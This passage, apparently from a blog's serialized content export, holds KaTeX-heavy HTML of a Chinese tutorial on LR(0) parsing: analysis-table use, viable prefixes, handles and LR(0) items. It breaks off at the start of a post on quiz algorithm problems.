class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>10</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>11</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>在得到分析表后，对于任意字符串，从<strong>状态0</strong>开始，启动自动机。对于读入的下一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>与当前的状态，定位到分析表中的元素。</p>\n<ul>\n<li>如果该元素是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">S_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>，则将这个字符push to stack，并且从当前状态转换到状态<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05724em;\">j</span></span></span></span>。</li>\n<li>如果该元素是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">r_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>，则根据（扩展）文法中第<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05724em;\">j</span></span></span></span>条规则，从stack中pop出<strong>与该规则右部字符串长度相同个数的字符</strong>；然后把规则左部的<strong>非终结字符</strong>push to stack，如果该非终结字符为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，则当前状态转换到分析表中<strong>当前状态</strong>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>所定位到的状态数。</li>\n<li>如果遇到分析表中的空值，则抛出一个error，分析出错。</li>\n<li>如果遇到<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>c</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">acc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">c</span></span></span></span>，分析结束。</li>\n</ul>\n<p>LR(0)的分析逻辑还算比较简单，但仍然有几个问题未解决：</p>\n<ol>\n<li>文法的活前缀是什么？</li>\n<li>如何得到文法活前缀的DFA？</li>\n<li>如何由DFA得到分析表？</li>\n</ol>\n<h3 id=\"文法的活前缀\"><a class=\"markdownIt-Anchor\" href=\"#文法的活前缀\"></a> 文法的活前缀</h3>\n<h4 id=\"前缀\"><a class=\"markdownIt-Anchor\" href=\"#前缀\"></a> 前缀</h4>\n<p>字符串的前缀是指字符串的任意首部。比如，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>b</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">abc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\">c</span></span></span></span>的前缀有：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi><mo separator=\"true\">,</mo><mtext>  </mtext><mi>a</mi><mo separator=\"true\">,</mo><mtext>  </mtext><mi>a</mi><mi>b</mi><mo separator=\"true\">,</mo><mtext>  </mtext><mi>a</mi><mi>b</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon,\\;a,\\;ab,\\;abc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">ϵ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\">c</span></span></span></span>。</p>\n<h4 id=\"规范句型的活前缀\"><a class=\"markdownIt-Anchor\" href=\"#规范句型的活前缀\"></a> 规范句型的活前缀</h4>\n<blockquote>\n<p>回溯学习：规范句型是什么?<br />\n用规范推导所推导出的句型称为规范句型。<br />\n回溯学习：什么是规范推导？<br />\n规范推导就是最右推导，这与自底向上分析法中<strong>最左规约</strong>是相对应的。</p>\n</blockquote>\n<p>而规范句型的活前缀，是指规范句型中、<strong>不包含句柄右边任何符号</strong>的前缀。</p>\n<blockquote>\n<p>回溯学习：句柄是什么？<br />\n句柄是一个句型的最左直接短语。</p>\n<p>那直接短语又是什么？</p>\n<p>假设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>是文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的一个句型，如果有</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>A</mi><mi>δ</mi><mo>∧</mo><mi>A</mi><mo>⇒</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A \\Rightarrow \\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>则称<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>是相对于非终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>的、句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>的一个直接短语。</p>\n</blockquote>\n<p>从LR分析法的定义也能看出，当所分析的输入串没有语法错误时，每时每刻的stack里的符号与剩余的输入符号串都能形成一个规范句型。<br />\n并且，如果stack中一旦存在<strong>句柄</strong>，那它立马就会被规约了，直到没有句柄为止。</p>\n<p>那就很明显了，实际上，stack中的字符就是<strong>规范句型的活前缀</strong>。那么，问题就转化为能不能将stack中的字符串识别为一个规范句型活前缀了。</p>\n<h4 id=\"lr0项目\"><a class=\"markdownIt-Anchor\" href=\"#lr0项目\"></a> LR(0)项目</h4>\n<p>由前文的活前缀定义，在一个规范句型的活前缀中，绝不含有句柄右边的任何符号，但仍然有可能含有或不含句柄的部分符号。因此会有三种情形：</p>\n<ol>\n<li>活前缀中已经含有句柄的全部字符。也就是说，某一规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>的右部已经出现在了stack顶端，此时应该进行规约。</li>\n<li>活前缀中只含有句柄的一部分字符。假如说存在一个规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><msub><mi>α</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha_1 \\alpha_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，那只有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>在stack顶端，需要继续输入字符。</li>\n<li>活前缀中完全没有任何句柄的符号，需要输入字符。</li>\n</ol>\n"},{"title":"两道有点麻烦的算法题","top_img":false,"cover":"/img/CSAPP.jpeg","date":"2020-11-05T02:13:51.000Z","katex":true,"_content":"\n昨天做ICS quiz 1的时候有两道题没做出来，在这里记一下。\n\n## 不用control flow logics（循环、分支）把输入的32-bit 